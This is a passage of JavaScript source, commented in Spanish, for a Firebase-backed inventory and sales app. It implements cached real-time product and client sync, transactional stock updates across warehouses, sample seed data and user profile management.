// completo o descontar stock sobre un valor que ya no es real. Una
// vez conectado, el listener en tiempo real (más abajo) sigue
// funcionando igual de bien sin este caché — la app recibe cada
// cambio al instante mientras esté abierta, sin volver a pedir nada.
// /clients sí mantiene el caché (persistCache=true): ahí un dato con
// unas horas de atraso (ej. un cliente nuevo que tarda en aparecer)
// no rompe nada, y sigue aportando el ahorro de ancho de banda
// original (ver bloque de arriba) para esa colección.
function watchCollectionWithCache(ref, cacheKey, idField, callback, onError, persistCache) {
  if (persistCache === undefined) persistCache = true;
  const itemsMap = new Map();
  let emitTimer = null;
  const scheduleEmit = () => {
    if (emitTimer) return;
    emitTimer = setTimeout(() => {
      emitTimer = null;
      callback(Array.from(itemsMap.values()));
    }, 50);
  };

  const cache = persistCache ? readLocalCache(cacheKey) : null;
  const now = Date.now();
  const needsFullResync = !persistCache || !cache || !cache.lastFullSync || (now - cache.lastFullSync) > FULL_RESYNC_INTERVAL_MS;
  const lastFullSyncToKeep = (cache && !needsFullResync) ? cache.lastFullSync : now;

  // 1) Pintar de inmediato con lo último guardado localmente, sin
  // esperar ninguna respuesta de red — así la pantalla no queda en
  // blanco mientras se resuelve la sincronización de abajo. Si
  // persistCache es false, no hay nada guardado que pintar: se espera
  // la lectura completa de abajo (siempre corta, /products no es tan
  // grande como para notarse en la práctica).
  if (cache && cache.items) {
    Object.keys(cache.items).forEach(key => itemsMap.set(key, cache.items[key]));
    scheduleEmit();
  }

  function persist(lastSyncTs, lastFullSyncTs) {
    if (!persistCache) return;
    const items = {};
    itemsMap.forEach((v, k) => { items[k] = v; });
    writeLocalCache(cacheKey, { items, lastSync: lastSyncTs, lastFullSync: lastFullSyncTs });
  }

  function applySnapshotAndPersist(snap, lastSyncTs, lastFullSyncTs) {
    snap.forEach(child => {
      const val = child.val();
      if (val && val.deleted) { itemsMap.delete(child.key); return; } // borrado lógico: no se pinta ni se guarda en caché
      const item = { ...val };
      item[idField] = child.key;
      itemsMap.set(child.key, item);
    });
    scheduleEmit();
    persist(lastSyncTs, lastFullSyncTs);
  }

  const query = needsFullResync ? ref : ref.orderByChild('updatedAt').startAt(cache.lastSync + 1);
  if (needsFullResync) itemsMap.clear(); // resincronización completa: se descarta el caché viejo por si acaso quedó un borrado sin reflejar

  let lastFullSyncSoFar = lastFullSyncToKeep;

  // Trae TODO el nodo de nuevo ahora mismo (bypasea el filtro
  // incremental y la espera de 3 horas), reemplaza el caché en
  // memoria por completo (así también se limpian productos borrados
  // que hubieran quedado colgados) y re-emite a la pantalla. Se
  // reintenta la lectura tal cual pase lo que pase con la conexión
  // en vivo — es una lectura de "una sola vez", no depende de que el
  // listener esté conectado.
  function forceRefresh() {
    return ref.once('value').then(snap => {
      itemsMap.clear();
      const ts = Date.now();
      lastFullSyncSoFar = ts;
      applySnapshotAndPersist(snap, ts, ts);
    }).catch(err => {
      if (onError) onError(err);
      throw err;
    });
  }

  query.once('value').then(snap => {
    applySnapshotAndPersist(snap, now, lastFullSyncSoFar);

    // 2) De ahora en más, cualquier alta o cambio (de este dispositivo
    // o de cualquier otro) llega en tiempo real, pero SOLO a partir de
    // este instante — con esto se evita volver a recibir (y bajar) el
    // catálogo entero como haría un .on('child_added') sin filtro.
    const liveQuery = ref.orderByChild('updatedAt').startAt(now);
    liveQuery.on('child_added', s => {
      const val = s.val();
      if (val && val.deleted) {
        // Puede pasar con un producto que YA existía antes de abrir
        // esta pantalla (su updatedAt viejo quedaba fuera del rango
        // que vigila este listener) y se borra lógicamente recién
        // ahora: al entrar su updatedAt nuevo en rango, Firebase lo
        // avisa como 'child_added' (primera vez que matchea la
        // query), no como 'child_changed'. Si no se sacara acá
        // también, quedaría visible para siempre en esta pantalla.
        itemsMap.delete(s.key);
        scheduleEmit();
        persist(Date.now(), lastFullSyncSoFar);
        return;
      }
      const item = { ...val }; item[idField] = s.key;
      itemsMap.set(s.key, item);
      scheduleEmit();
      persist(Date.now(), lastFullSyncSoFar);
    }, onError);
    liveQuery.on('child_changed', s => {
      const val = s.val();
      if (val && val.deleted) {
        // Borrado lógico hecho en cualquier dispositivo: llega como un
        // cambio normal (mismo canal que editar precio/stock), así que
        // se refleja al instante en todas las pantallas abiertas.
        itemsMap.delete(s.key);
        scheduleEmit();
        persist(Date.now(), lastFullSyncSoFar);
        return;
      }
      const item = { ...val }; item[idField] = s.key;
      itemsMap.set(s.key, item);
      scheduleEmit();
      persist(Date.now(), lastFullSyncSoFar);
    }, onError);

    // Borrado FÍSICO (.remove()) de cualquier dispositivo: a diferencia
    // de child_added/child_changed, este evento no depende de
    // "updatedAt" (un nodo borrado ya no tiene ese campo para matchear
    // ningún rango), así que se escucha sobre el nodo COMPLETO sin
    // filtro. Esto es seguro en cuanto a consumo de datos: a diferencia
    // de child_added, child_removed NUNCA reproduce el estado inicial
    // de los hijos ya existentes al conectarse — solo avisa de
    // borrados que ocurren de ahora en adelante. Así, un producto
    // eliminado por cualquier persona desaparece al instante de
    // cualquier pantalla abierta, sin esperar ningún resync periódico.
    ref.on('child_removed', s => {
      itemsMap.delete(s.key);
      scheduleEmit();
      persist(Date.now(), lastFullSyncSoFar);
    }, onError);

    watchCollectionWithCache._activeQueries.push(liveQuery);
  }).catch(onError);

  return { forceRefresh };
}
watchCollectionWithCache._activeQueries = [];

// =========================================================
// PRODUCTOS
// =========================================================

// Tiempo real solo en Stock y Nueva Nota — donde el usuario necesita
// ver cambios al instante (otro vendedor edita stock). Carga inicial
// con caché+delta y eventos incrementales en tiempo real desde ahí en
// adelante — ver el bloque "CACHÉ LOCAL + SINCRONIZACIÓN INCREMENTAL"
// más arriba para el detalle completo de por qué y cómo.
function watchProducts(callback) {
  const onError = err => {
    console.error('[Firebase] Error leyendo /products:', err);
    alert('No se pudo cargar el stock (permiso denegado o sin conexión). Revisa la consola para más detalle.');
  };
  // Limpieza única: borra cualquier snapshot de /products que haya
  // quedado guardado en este dispositivo de versiones anteriores de
  // la app (cuando SÍ se persistía entre sesiones). Sin esto, un
  // teléfono que ya tenía guardado un "mf_cache_products_v1" viejo lo
  // seguiría teniendo en su almacenamiento aunque el código ya no lo
  // lea nunca más — no causa ningún daño dejarlo ahí, pero tampoco
  // sirve de nada y solo ocupa espacio.
  try {
    if (typeof localStorage !== 'undefined') localStorage.removeItem('mf_cache_products_v1');
  } catch (err) {}
  const watcher = watchCollectionWithCache(refProducts, 'mf_cache_products_v1', 'code', callback, onError, /* persistCache */ false);
  // Se guarda la referencia global al watcher de productos para que
  // cualquier otra pantalla (ej. import-stock.js) pueda pedir un
  // refresco inmediato después de escribir en Firebase, en vez de
  // depender únicamente del listener en tiempo real.
  window._productsWatcher = watcher;
  return watcher;
}

// Fuerza a que Stock (y cualquier otra vista que use watchProducts)
// vuelva a leer /products completo ahora mismo, ignorando el caché
// local y la ventana de 3 horas. Se usa después de importar/guardar
// en bloque para que los datos actualizados aparezcan al instante,
// sin depender de que el listener en tiempo real llegue a tiempo.
// Devuelve una promesa que resuelve cuando el refresco terminó.
function refreshProductsNow() {
  if (window._productsWatcher && typeof window._productsWatcher.forceRefresh === 'function') {
    return window._productsWatcher.forceRefresh();
  }
  // watchProducts todavía no corrió en esta pantalla (ej. se llamó
  // desde una vista donde Stock no está montado) — no hay nada que
  // refrescar en memoria, pero al menos se limpia el caché guardado
  // para que la próxima vez que se abra Stock traiga todo de nuevo.
  try {
    if (typeof localStorage !== 'undefined') localStorage.removeItem('mf_cache_products_v1');
  } catch (err) {}
  return Promise.resolve();
}

// Antes: "Guardar cambios" en el modal de Editar producto hacía un
// set() completo, incluyendo el stock que estaba cargado en el
// formulario desde que se abrió el modal. Si mientras tanto alguien
// vendía ese mismo producto (el stock real bajaba), guardar el
// formulario pisaba ese cambio real con el valor viejo — como si la
// venta nunca hubiera pasado.
//
// Ahora: los campos normales (nombre, descripción, precio,
// categoría) se actualizan aparte y nunca tocan el stock. El stock
// se aplica con concurrencia optimista — se pasa el valor que el
// formulario tenía al abrirse (expectedStock); si el valor real en
// el servidor sigue siendo ese mismo, se aplica el cambio con
// seguridad. Si cambió mientras tanto (alguien vendió o ajustó el
// producto), se cancela y se avisa, en vez de pisarlo en silencio.
function saveProduct(code, data, expectedStock, isNew) {
  const { stock, ...restRaw } = data;
  // "updatedAt" es lo que permite a watchProducts (ver bloque de
  // caché arriba) pedir solo lo que cambió desde la última vez, en
  // vez de bajar el catálogo entero cada vez que se abre la app.
  // Va en TODA escritura de producto, incluso si "rest" venía vacío.
  const rest = { ...restRaw, updatedAt: firebase.database.ServerValue.TIMESTAMP };
  const productRef = refProducts.child(code);

  if (stock === undefined) {
    return productRef.update(rest);
  }

  if (isNew) {
    // Producto nuevo: la pantalla ya revisó que el código no
    // estuviera en su copia local de la lista, pero esa copia
    // puede estar unos segundos desactualizada. Si dos personas
    // crean "GTR-006" casi al mismo tiempo, sin esto la segunda
    // sobreescribiría en silencio el producto de la primera. La
    // transacción solo confirma la escritura si el nodo sigue
    // vacío en el servidor en ese instante; si no, se cancela y
    // se avisa en vez de pisar el producto ya creado.
    //
    // Excepción: si el nodo existe pero está marcado deleted:true
    // (borrado lógico, ver deleteProduct), NO cuenta como "ya
    // existe" — se permite la escritura y listo, porque para el
    // usuario ese código simplemente no está en uso. Sin este
    // caso, recrear un código que se había borrado (ej. reimportar
    // el Excel completo después de "Eliminar todo") fallaba
    // siempre, porque el nodo viejo seguía ahí aunque oculto.
    return productRef.transaction(current => {
      if (current !== null && !current.deleted) return; // aborta: el código ya existe y sigue activo
      // Sin esto, un producto nuevo nacía con stock TOTAL pero sin
      // ningún almacén asignado — al mirar la pestaña de un almacén
      // específico (Stock) mostraba 0 para siempre, aunque el total
      // fuera correcto. Todo el stock inicial se asume en alm1 (el
      // almacén principal, siempre existe) salvo que quien llama ya
      // haya mandado su propio desglose en rest.almacenes.
      const almacenes = rest.almacenes || { alm1: stock };
      return { ...rest, stock, almacenes };
    }).then(result => {
      if (!result.committed) {
        throw new Error(
          `Ya existe un producto con el código ${code} (lo acaba de crear otra persona). ` +
          'Recarga la lista y edítalo desde ahí en vez de crearlo de nuevo.'
        );
      }
    });
  }

  if (expectedStock === undefined) {
    // No hay un valor previo con el que compararse (ej. import
    // masivo actualizando solo precio/nombre en un producto que ya
    // existe) — se escribe directo, no hace falta transacción
    // porque no hay nada con lo que pueda chocar.
    return productRef.update({ ...rest, stock });
  }

  const fieldsUpdate = productRef.update(rest);
  const stockUpdate = productRef.child('stock').transaction(current => {
    if ((current || 0) === expectedStock) return stock;
    return; // aborta: el stock cambió mientras se editaba
  }).then(result => {
    if (!result.committed) {
      throw new Error(
        'El stock cambió mientras editabas este producto (alguien lo vendió o ajustó). ' +
        'El nombre/precio sí se guardaron; vuelve a abrir el producto para ver el stock real y ajustarlo de nuevo si hace falta.'
      );
    }
  });

  return Promise.all([fieldsUpdate, stockUpdate]);
}

// Cambia la clave (código) de un producto ya existente. Firebase no
// permite "mover" una clave directamente — hay que copiar los datos
// a la clave nueva y borrar la vieja. Se hace en dos pasos seguros:
// 1) se "reserva" la clave nueva con una transacción (igual que al
//    crear un producto) para no pisar uno que otra persona haya
//    creado con ese mismo código justo en ese instante;
// 2) se mueve el dato real con un update() multi-ruta, que Firebase
//    aplica de forma atómica (o se escriben ambas rutas, o ninguna).
function renameProductCode(oldCode, newCode) {
  const newRef = refProducts.child(newCode);
  return newRef.transaction(current => {
    if (current !== null && !current.deleted) return; // aborta: ya existe un producto activo con el código nuevo
    return true; // valor temporal, se reemplaza por los datos reales abajo
  }).then(result => {
    if (!result.committed) {
      throw new Error(`Ya existe un producto con el código ${newCode}.`);
    }
    return refProducts.child(oldCode).once('value');
  }).then(snap => {
    const data = snap.val();
    if (data === null) {
      // El producto original desapareció entre que se abrió el modal
      // y se guardó (ej. lo borraron desde otro dispositivo) — se
      // libera la clave nueva que se había reservado y se avisa.
      return newRef.remove().then(() => {
        throw new Error('El producto original ya no existe.');
      });
    }
    const updates = {};
    updates[oldCode] = null;
    updates[newCode] = { ...data, updatedAt: firebase.database.ServerValue.TIMESTAMP };
    return refProducts.update(updates);
  });
}

// Borrado FÍSICO real: el nodo se elimina de /products de verdad (ya
// no queda nada "fantasma" visible en la consola de Firebase).
//
// Antes esto se hacía con un borrado lógico (deleted:true + stock:0
// en vez de .remove()) porque el listener en tiempo real de otras
// pantallas/dispositivos (watchCollectionWithCache) solo escuchaba
// altas y cambios dentro de una ventana que arranca desde que esa
// pantalla se abrió — y a un borrado real no le cambia ningún campo,
// simplemente desaparece, así que ese listener no se enteraba hasta
// la resincronización completa cada 3 horas (FULL_RESYNC_INTERVAL_MS).
//
// Ahora watchCollectionWithCache además escucha 'child_removed' sobre
// el nodo completo (sin depender de updatedAt), así que un borrado
// real SÍ llega al instante a cualquier pantalla abierta en cualquier
// dispositivo — sin necesidad del truco del borrado lógico.
function deleteProduct(code) {
  try {
    return refProducts.child(code).remove();
  } catch (err) {
    // .child() valida la clave de forma SÍNCRONA — si el código tiene
    // un carácter que Firebase rechaza (dato viejo de antes de que
    // existiera el saneo de códigos), esto lanza una excepción normal
    // de JS en vez de una promesa rechazada, lo que puede tumbar
    // código que espera un .catch(). Se envuelve para que siempre se
    // comporte como una promesa, sin importar dónde se llame.
    return Promise.reject(err);
  }
}

// Antes: leía el stock, restaba en JavaScript y guardaba — dos
// vendedores confirmando el mismo producto al mismo tiempo podían
// leer el mismo valor y pisarse el resultado uno al otro (además de
// que un valor insuficiente simplemente se "recortaba" a 0 sin avisar,
// permitiendo vender de más sin que nadie se enterara).
//
// Ahora cada producto se descuenta con una transacción real: el
// servidor de Firebase la resuelve de forma atómica, reintentando
// sola si hay conflicto, y CANCELA la operación (sin guardar nada)
// si no hay stock suficiente en el momento exacto de aplicarla.
// Suma una cantidad al stock actual de un producto (ej. importar un
// Excel al llegar un contenedor). Transacción segura: no pisa ventas
// que estén pasando al mismo tiempo, cada suma se aplica sobre el
// valor real más reciente del servidor.
//
// Antes de sumar, se confirma que el producto siga existiendo. Esto
// importa desde que deleteProduct() borra el nodo de verdad (ver más
// abajo): sin esta verificación, si alguien elimina un producto justo
// en el instante entre que se detecta un error y se intenta esta
// función (ej. reversión de una venta que falló a medias, ver
// decrementStock/addStockWithRetry), la transacción sobre
// "/stock" recrearía el nodo desde cero con SOLO stock y updatedAt —
// un producto fantasma sin nombre ni precio. Con esta comprobación,
// en ese caso se avisa con un error claro en vez de recrear algo roto.
function addStock(code, qty) {
  const productRef = refProducts.child(code);
  return productRef.once('value').then(snap => {
    if (!snap.exists()) {
      const err = new Error(`El producto ${code} ya no existe (fue eliminado) — no se pudo sumar stock.`);
      err.productDeleted = true;
      throw err;
    }
    const stockUpdate = productRef.child('stock').transaction(current => (current || 0) + qty);
    // "updatedAt" se actualiza en paralelo (no dentro de la misma
    // transacción, que solo puede tocar /products/{code}/stock) para
    // que la sincronización incremental de watchProducts detecte este
    // cambio en la próxima carga sin tener que rebajar todo /products.
    const touch = productRef.update({ updatedAt: firebase.database.ServerValue.TIMESTAMP }).catch(() => {});
    return stockUpdate.then(result => touch.then(() => result));
  });
}

// Suma qty a un producto reintentando varias veces antes de rendirse.
// Se usa específicamente para REVERTIR un descuento de stock que no
// debía haber quedado aplicado (ver decrementStock y confirmOrder) —
// a diferencia de una escritura normal, acá no hay margen para un
// "best-effort" silencioso: si esto no se aplica, el negocio pierde
// stock real sin ningún pedido que lo respalde, y nadie se entera
// hasta que alguien intenta vender algo que "debería" tener stock.
async function addStockWithRetry(code, qty, attempts) {
  attempts = attempts || 3;
  let lastErr;
  for (let i = 0; i < attempts; i++) {
    try {
      await addStock(code, qty);
      return;
    } catch (err) {
      lastErr = err;
      // Si el producto ya no existe (lo borraron justo en este
      // instante), reintentar no va a cambiar nada — reintentar 3
      // veces solo demoraría el aviso sin necesidad.
      if (err && err.productDeleted) break;
      if (i < attempts - 1) await new Promise(r => setTimeout(r, 400 * (i + 1)));
    }
  }
  console.error(`[Firebase] No se pudo revertir stock de ${code} (+${qty}) tras ${attempts} intentos:`, lastErr);
  if (lastErr && lastErr.productDeleted) {
    // Se agotaron los reintentos porque el producto ya no existe: la
    // instrucción de "sumale X manualmente" no aplica (no hay a qué
    // producto sumarle), así que se avisa distinto — el ajuste real
    // que hace falta es de otro tipo (revisar si esa venta debe
    // anularse, o si el producto debe recrearse a mano).
    alert(
      `⚠ IMPORTANTE: la venta de "${code}" (${qty} unidad(es)) no se pudo revertir porque el producto ya no existe (fue eliminado). ` +
      'Revisa el pedido en Historial y decide si corresponde anularlo.'
    );
    return;
  }
  // Se agotaron los reintentos: en vez de tragarse el error (como
  // antes), se avisa de forma imposible de ignorar — con el código y
  // la cantidad exactos para que se pueda corregir a mano en Stock
  // ahora mismo, en vez de que el inventario quede mal en silencio.
  alert(
    `⚠ IMPORTANTE: no se pudo devolver ${qty} unidad(es) al stock de "${code}" tras un error. ` +
    `Anda a Stock AHORA y sumale ${qty} manualmente a ese código para que el inventario quede correcto.`
  );
}

async function decrementStock(items) {
  const results = await Promise.all(items.map(async item => {
    const stockRef = refProducts.child(item.code).child('stock');
    const result = await stockRef.transaction(current => {
      const currentStock = current || 0;
      if (currentStock < item.qty) return; // aborta: no hay suficiente
      return currentStock - item.qty;
    });
    if (result.committed) {
      // Igual que en addStock: bump de updatedAt en paralelo, fuera de
      // la transacción, para que la venta se refleje en la próxima
      // sincronización incremental de watchProducts.
      refProducts.child(item.code).update({ updatedAt: firebase.database.ServerValue.TIMESTAMP }).catch(() => {});
    }
    return { code: item.code, qty: item.qty, ok: result.committed };
  }));

  const failed    = results.filter(r => !r.ok);
  const succeeded = results.filter(r => r.ok);

  if (failed.length > 0) {
    // BUG REAL que había acá: las transacciones de cada producto se
    // disparan en paralelo (Promise.all), así que si un pedido tiene
    // 3 productos y el 3ro no tiene stock suficiente, los 2 primeros
    // YA se habían descontado con éxito antes de detectar el fallo.
    // Como el pedido completo no se guarda (ver confirmOrder()), eso
    // dejaba el inventario reducido "fantasma" sin ningún pedido real
    // detrás — se perdía stock silenciosamente cada vez que un
    // pedido con varios productos fallaba a medias.
    // Ahora, si algo falla, se revierte (con reintentos, y avisando
    // fuerte si aun así no se puede) lo que sí se había descontado,
    // para que la operación sea todo-o-nada de verdad.
    await Promise.all(succeeded.map(r => addStockWithRetry(r.code, r.qty)));

    const err = new Error(
      'Stock insuficiente para: ' + failed.map(f => f.code).join(', ') +
      '. No se descontó nada (se revirtió lo que ya se había aplicado).'
    );
    err.failedItems = failed;
    throw err;
  }
  return results;
}

// =========================================================
// ALMACENES (Stock por almacén)
// =========================================================
// Hasta 6 almacenes fijos (según plan — ver plan-limits.js). Cada
// producto guarda su cantidad en cada uno bajo
// /products/{code}/almacenes/{almId} — el campo /products/{code}/stock
// sigue siendo el TOTAL (suma de todos), y es el que usa el resto de
// la app (Pedidos, Dashboard, alerta de stock bajo) sin ningún cambio.
// Esta lista trae los 6 con su label por defecto; cuáles están
// realmente activos y cómo se llaman de verdad para esta tienda lo
// resuelve cada vista con getAlmacenesConfig() (ver aplicarConfigAlmacenes
// en stock.js).
const WAREHOUSES = ALMACENES_IDS.map(id => ({ id, label: ALMACENES_DEFAULT_NOMBRES[id] }));

// Edición manual de la cantidad de UN producto en UN almacén (desde
// el modal de Stock). Como saveProduct() con el stock total: compara
// contra el valor esperado (lo que la pantalla tenía cuando se abrió
// el modal) para no pisar un cambio que haya llegado mientras tanto,
// y ajusta el total /stock por la misma diferencia para que el
// invariante "stock == suma de almacenes" nunca se rompa.
function updateWarehouseStock(code, whId, newQty, expectedQty) {
  const productRef = refProducts.child(code);
  const before = expectedQty || 0;
  return productRef.child('almacenes').child(whId).transaction(current => {
    if ((current || 0) !== before) return; // aborta: cambió mientras se editaba
    return newQty;
  }).then(result => {
    if (!result.committed) {
      throw new Error(
        'La cantidad de este almacén cambió mientras editabas (alguien más la ajustó). ' +
        'Vuelve a abrirlo para ver el valor real y ajustarlo de nuevo si hace falta.'
      );
    }
    const delta = newQty - before;
    return productRef.child('stock').transaction(current => (current || 0) + delta)
      .then(() => productRef.update({ updatedAt: firebase.database.ServerValue.TIMESTAMP }).catch(() => {}));
  });
}

// Reemplaza (no suma) la cantidad de UN almacén de un producto.
// Usado por la importación GENERAL ("Importar todo", modo que
// reemplaza el stock en vez de sumarlo) cuando la persona eligió a
// qué almacén corresponde el archivo — ver populateImportWarehousePicker
// en import-stock.js. A diferencia de updateWarehouseStock (edición
// manual de una sola fila desde el modal), acá NO se aborta si el
// valor cambió mientras tanto: viene de una importación masiva donde,
// igual que ya hace "Importar todo" con el total, gana lo último
// importado. Mantiene el invariante stock == suma(almacenes) ajustando
// /stock por la diferencia, igual que updateWarehouseStock.
function setWarehouseStock(code, whId, newQty, beforeQty) {
  const productRef = refProducts.child(code);
  const before = beforeQty || 0;
  return productRef.child('almacenes').child(whId).transaction(() => newQty)
    .then(() => {
      const delta = newQty - before;
      return productRef.child('stock').transaction(current => (current || 0) + delta)
        .then(() => productRef.update({ updatedAt: firebase.database.ServerValue.TIMESTAMP }).catch(() => {}));
    });
}

// Suma qty a un almacén de un producto (usado por la importación de
// cantidad por almacén). Igual que addStock, pero además del total
// /stock, suma también en /almacenes/{whId} — ambos por transacción,
// así que dos importaciones/ediciones al mismo tiempo no se pisan.
function addWarehouseStock(code, whId, qty) {
  const productRef = refProducts.child(code);
  return productRef.once('value').then(snap => {
    if (!snap.exists()) {
      const err = new Error(`El producto ${code} ya no existe (fue eliminado).`);
      err.productDeleted = true;
      throw err;
    }
    const almUpdate = productRef.child('almacenes').child(whId).transaction(current => (current || 0) + qty);
    const stockUpdate = productRef.child('stock').transaction(current => (current || 0) + qty);
    const touch = productRef.update({ updatedAt: firebase.database.ServerValue.TIMESTAMP }).catch(() => {});
    return Promise.all([almUpdate, stockUpdate, touch]);
  });
}

// =========================================================
// CLIENTES
// =========================================================

// Tiempo real en Pedidos — la lista de clientes debe estar siempre
// actualizada mientras el usuario trabaja. Mismo mecanismo de
// caché+delta que watchProducts (ver el bloque de arriba).
function watchClients(callback) {
  const onError = err => {
    console.error('[Firebase] Error leyendo /clients:', err);
    alert('No se pudo cargar la lista de clientes (permiso denegado o sin conexión). Revisa la consola para más detalle.');
  };
  watchCollectionWithCache(refClients, 'mf_cache_clients_v1', 'ruc', callback, onError);
}

// ── Apagar listeners en tiempo real antes de cerrar sesión ──────
// watchProducts/watchClients quedan escuchando /products y /clients
// mientras la sesión está abierta. Si se hace signOut() sin
// apagarlos primero, ese mismo listener sigue activo un instante
// sin token de auth válido, las reglas de Firebase responden
// PERMISSION_DENIED, y eso disparaba los alert() de "no se pudo
// cargar..." justo al cerrar sesión.
// Esto NO borra ni cambia nada en Firebase — solo desconecta los
// oyentes activos de este cliente antes del signOut(), para que no
// alcancen a recibir ese error. Se llama desde logout()/
// switchAccount() en auth-guard.js, antes de firebase.auth().signOut().
function stopRealtimeWatchers() {
  // refProducts/refClients son Proxies (scopedRef) que LANZAN un
  // error si currentTiendaId está vacío (p. ej. sesión de
  // Súper-admin, que no tiene tienda asignada). Sin este try/catch,
  // ese error corta la ejecución de logout()/switchAccount() ANTES
  // de llegar a firebase.auth().signOut() — por eso el botón
  // "Cerrar sesión"/"Cambiar de cuenta" no hacía nada en cuentas de
  // Súper-admin. Si no hay tienda activa, tampoco hay nada real que
  // desconectar, así que ignorar el error acá es seguro.
  try { refProducts.off(); } catch (e) { /* sin tienda activa, nada que apagar */ }
  try { refClients.off(); } catch (e) { /* sin tienda activa, nada que apagar */ }
  try { refConfig.child('almacenesNombres').off(); refConfig.child('almacenesActivos').off(); } catch (e) { /* sin tienda activa, nada que apagar */ }
  // Las queries incrementales de watchProducts/watchClients
  // (orderByChild('updatedAt').startAt(...)) son objetos de query
  // aparte del ref plano de arriba — un .off() en el ref plano no las
  // desconecta a ellas. Se guardan todas en _activeQueries apenas se
  // crean, así que se apagan una por una acá.
  try {
    watchCollectionWithCache._activeQueries.forEach(q => q.off());
    watchCollectionWithCache._activeQueries.length = 0;
  } catch (e) { /* sin tienda activa, nada que apagar */ }
}

function saveClient(ruc, data) {
  return refClients.child(ruc).set({ ...data, updatedAt: firebase.database.ServerValue.TIMESTAMP });
}

function deleteClient(ruc) {
  return refClients.child(ruc).remove();
}

function getClient(ruc) {
  return refClients.child(ruc).get().then(snap => snap.val());
}

// =========================================================
// SEED — Solo se ejecuta una vez en la vida del proyecto.
// Usa meta/seeded como bandera permanente.
// =========================================================

const refMeta = scopedRef('meta');

// Datos de EJEMPLO para la maqueta de Adonay — reemplázalos por
// el catálogo/cartera real de clientes cuando corresponda.
// "almacenes" reparte la cantidad total entre los 3 almacenes de
// ejemplo (alm1/alm2/alm3) — ver WAREHOUSES más abajo. El campo
// "stock" es siempre la SUMA de los 3 almacenes.
const SEED_PRODUCTS = {
  'PRD-001': { name: "Producto de ejemplo A", desc: "Línea estándar · Presentación 1", price: 45,  stock: 20, category: 'linea-1',   almacenes: { alm1: 10, alm2: 6, alm3: 4 } },
  'PRD-002': { name: "Producto de ejemplo B", desc: "Línea estándar · Presentación 2", price: 120, stock: 3,  category: 'linea-1',   almacenes: { alm1: 1,  alm2: 1, alm3: 1 } },
  'PRD-003': { name: "Producto de ejemplo C", desc: "Línea premium · Presentación 1",  price: 260, stock: 8,  category: 'linea-2',   almacenes: { alm1: 5,  alm2: 3, alm3: 0 } },
  'PRD-004': { name: "Producto de ejemplo D", desc: "Línea premium · Presentación 2",  price: 75,  stock: 15, category: 'linea-2',   almacenes: { alm1: 5,  alm2: 5, alm3: 5 } },
  'PRD-005': { name: "Producto de ejemplo E", desc: "Accesorio / insumo",              price: 18,  stock: 5,  category: 'accesorios', almacenes: { alm1: 2,  alm2: 2, alm3: 1 } }
};

const SEED_CLIENTS = {
  '20601234567': { nombre: "Cliente de ejemplo 1 S.A.C.", ciudad: 'Lima' },
  '20512986754': { nombre: "Cliente de ejemplo 2 E.I.R.L.", ciudad: 'Arequipa' },
  '20489001234': { nombre: "Cliente de ejemplo 3 S.A.", ciudad: 'Cusco' },
  '20345678901': { nombre: "Cliente de ejemplo 4 S.A.C.", ciudad: 'Trujillo' }
};

async function seedIfEmpty() {
  try {
    const seededSnap = await refMeta.get();
    if (seededSnap.exists()) return;
    const [productsSnap, clientsSnap] = await Promise.all([
      refProducts.get(),
      refClients.get()
    ]);
    if (!productsSnap.exists()) await refProducts.set(SEED_PRODUCTS);
    if (!clientsSnap.exists()) await refClients.set(SEED_CLIENTS);
    await refMeta.set(true);
  } catch (err) {
    console.error('Seed error:', err);
  }
}

// MODO DEMO: seedIfEmpty() ya no se llama solo al cargar el archivo
// (antes no había "tiendas" — todo compartía un único catálogo). Ahora
// cada tienda necesita su propio catálogo de ejemplo la primera vez
// que alguien entra a ella, así que auth-guard.js la llama apenas
// confirma con qué tienda inició sesión (ver authReady). Una vez que
// conectes el proyecto Firebase real de Adonay, quita esa llamada (o
// reemplaza mock-sdk.js) y ya no se ejecutará contra tu base real.

// =========================================================
// USUARIOS (cuentas individuales de vendedor + admin)
// =========================================================
// Antes había UNA sola cuenta de vendedor compartida entre todo el
// equipo (adonaymiusiclog+vendedor@gmail.com). Eso significaba que si
// algo salía mal, era imposible saber cuál persona lo hizo, y que
// para bloquear a alguien que dejaba de trabajar ahí había que
// cambiarle la contraseña a TODO el equipo de una vez.
//
// Ahora cada vendedor tiene su propia cuenta de Firebase Auth, y el
// rol/nombre/estado de cada una vive en tiendas/{tiendaId}/usuarios/{uid}
// (dentro de SU tienda, no en un lugar compartido con las demás):
//   { nombre: "Juan Pérez", correo: "juan@...", rol: "vendedor" | "admin", activo: true|false, creadoEn: <timestamp> }
//
// El campo "activo" es la pieza clave: no es solo un adorno visual.
// Las reglas de Firebase (cuando conectes el proyecto real) deben
// exigir que activo === true para poder leer o escribir cualquier
// dato DE ESA TIENDA. Apagar a alguien desde "Registros" lo bloquea
// de verdad, del lado del servidor — no solo le oculta botones en
// pantalla (ver también authReady en auth-guard.js, que hace el
// mismo chequeo en cada carga de página).

function getUserProfile(uid) {
  return refUsers.child(uid).once('value').then(snap => (snap.exists() ? { uid, ...snap.val() } : null));
}

async function getAllUsers() {
  const snap = await refUsers.once('value');
  const out = [];
  snap.forEach(child => { out.push({ uid: child.key, ...child.val() }); });
  // Más recientes primero, para que un vendedor nuevo aparezca arriba.
  out.sort((a, b) => (b.creadoEn || 0) - (a.creadoEn || 0));
  return out;
}

function setUserActive(uid, activo) {
  return refUsers.child(uid).update({ activo: !!activo });
}

// Actualiza el nombre para mostrar de LA PROPIA cuenta (pantalla de
// Perfil). Vive en un lugar distinto según el rol: una cuenta de
// tienda (admin/vendedor) lo tiene en tiendas/{tiendaId}/usuarios/{uid}
// (refUsers); el súper-admin no pertenece a ninguna tienda, así que
// el suyo se guarda directamente en /cuentas/{uid} (antes esa cuenta
// no tenía dónde guardar un nombre propio — auth-guard.js usaba
// siempre el texto fijo "Súper-admin"; ahora respeta el que haya en
// cuentas/{uid}/nombre si existe).
function updateOwnName(uid, nombre) {
  if (currentTiendaId) {
    return refUsers.child(uid).update({ nombre });
  }
  return refCuentas.child(uid).update({ nombre });
}

// Elimina el perfil del usuario en tiendas/{tiendaId}/usuarios (y su
// entrada en /cuentas, para no dejar un mapeo huérfano). Esto le
// quita el acceso a la app de inmediato: sin ese perfil, auth-guard.js
// lo bloquea al iniciar sesión aunque su cuenta de Firebase Auth
// siga existiendo.
//
// Importante: esto NO borra la cuenta de Firebase Auth en sí. El SDK
// de Auth del lado del cliente solo permite que un usuario borre SU
// PROPIA cuenta (currentUser.delete()) — borrar la cuenta de OTRO
// usuario requiere el Admin SDK desde un backend, igual que
// scripts/limpiar-historial.js usa Admin SDK para el historial.
